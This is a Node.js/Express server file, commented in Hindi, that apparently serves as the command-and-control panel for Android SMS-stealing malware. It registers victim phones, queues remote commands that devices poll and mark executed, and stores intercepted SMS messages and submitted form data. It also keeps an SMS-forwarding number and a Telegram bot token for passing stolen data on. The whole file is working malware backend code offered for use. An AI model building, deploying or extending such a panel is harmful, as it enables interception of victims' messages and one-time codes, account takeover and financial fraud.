// server.js का पूरा कोड
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const db = new sqlite3.Database('./database.db', (err) => {
    if (err) console.error("Database connection error:", err.message);
    else {
        console.log("Connected to the SQLite database.");
        createTables();
    }
});

app.set('view engine', 'ejs');
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function createTables() {
    db.serialize(() => {
        db.run(`CREATE TABLE IF NOT EXISTS devices (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, device_name TEXT, os_version TEXT, phone_number TEXT, battery_level INTEGER, last_seen DATETIME NOT NULL, created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
        db.run(`CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, command_type TEXT NOT NULL, command_data TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
        db.run(`CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, sender TEXT NOT NULL, message_body TEXT NOT NULL, received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
        db.run(`CREATE TABLE IF NOT EXISTS form_submissions (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, custom_data TEXT NOT NULL, submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
        db.run(`CREATE TABLE IF NOT EXISTS global_settings (setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, setting_value TEXT)`);
        console.log("Database tables checked/created.");
    });
}

app.get('/', async (req, res) => {
    try {
        const devices = await new Promise((resolve, reject) => {
            db.all("SELECT * FROM devices ORDER BY created_at ASC", [], (err, rows) => {
                if (err) reject(err);
                const devicesWithStatus = rows.map(device => ({ ...device, is_online: (new Date() - new Date(device.last_seen)) / 1000 < 190 }));
                resolve(devicesWithStatus);
            });
        });
        const settings = await new Promise((resolve, reject) => {
            db.all("SELECT * FROM global_settings", [], (err, rows) => {
                if (err) reject(err);
                resolve(rows.reduce((acc, row) => ({ ...acc, [row.setting_key]: row.setting_value }), {}));
            });
        });
        res.render('panel', { devices, settings });
    } catch (error) {
        res.status(500).send("Error loading panel data: " + error.message);
    }
});

app.post('/delete-device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    db.serialize(() => {
        db.run("DELETE FROM devices WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM sms_logs WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM form_submissions WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM commands WHERE device_id = ?", [deviceId], (err) => res.redirect('/'));
    });
});

app.post('/api/device/register', (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    const now = new Date().toISOString();
    db.get("SELECT * FROM devices WHERE device_id = ?", [device_id], (err, row) => {
        if (row) {
            db.run("UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?", [device_name, os_version, battery_level, phone_number, now, device_id], () => res.json({ status: "success" }));
        } else {
            db.run(`INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`, [device_id, device_name, os_version, phone_number, battery_level, now, now], () => res.status(201).json({ status: "success" }));
        }
    });
});

app.get('/api/devices', (req, res) => {
    db.all("SELECT * FROM devices ORDER BY created_at ASC", [], (err, rows) => {
        res.json(rows.map(device => ({ ...device, is_online: (new Date() - new Date(device.last_seen)) / 1000 < 190 })));
    });
});

app.post('/api/config/sms_forward', (req, res) => {
    db.run("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?)", [req.body.forward_number], () => res.json({ status: "success" }));
});
app.get('/api/config/sms_forward', (req, res) => {
    db.get("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'", (err, row) => res.json({ forward_number: row ? row.setting_value : null }));
});

app.post('/api/config/telegram', (req, res) => {
    const { telegram_bot_token, telegram_chat_id } = req.body;
    db.serialize(() => {
        db.run("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?)", [telegram_bot_token]);
        db.run("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?)", [telegram_chat_id], () => res.json({ status: "success" }));
    });
});
app.get('/api/config/telegram', (req, res) => {
    db.all("SELECT * FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')", (err, rows) => {
        res.json(rows.reduce((acc, row) => ({ ...acc, [row.setting_key]: row.setting_value }), {}));
    });
});

app.post('/api/command/send', (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    db.run(`INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')`, [device_id, command_type, JSON.stringify(command_data)], () => res.status(201).json({ status: "success" }));
});

app.get('/api/device/:deviceId/commands', (req, res) => {
    const { deviceId } = req.params;
    db.all("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'", [deviceId], (err, rows) => {
        if (err || !rows || rows.length === 0) return res.json([]);
        const idsToUpdate = rows.map(r => r.id);
        db.run(`UPDATE commands SET status = 'sent' WHERE id IN (${idsToUpdate.map(() => '?').join(',')})`, idsToUpdate, () => {
            res.json(rows.map(cmd => ({ ...cmd, command_data: JSON.parse(cmd.command_data) })));
        });
    });
});

app.post('/api/command/:commandId/execute', (req, res) => {
    db.run("UPDATE commands SET status = 'executed' WHERE id = ?", [req.params.commandId], () => res.json({ status: "success" }));
});

app.delete('/api/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    db.serialize(() => {
        db.run("DELETE FROM devices WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM sms_logs WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM form_submissions WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM commands WHERE device_id = ?", [deviceId], () => res.json({ status: "success" }));
    });
});

app.delete('/api/sms/:smsId', (req, res) => {
    db.run("DELETE FROM sms_logs WHERE id = ?", [req.params.smsId], () => res.json({ status: "success" }));
});

app.listen(PORT, () => console.log(`Server with Web Panel running on http://localhost:${PORT}` ));
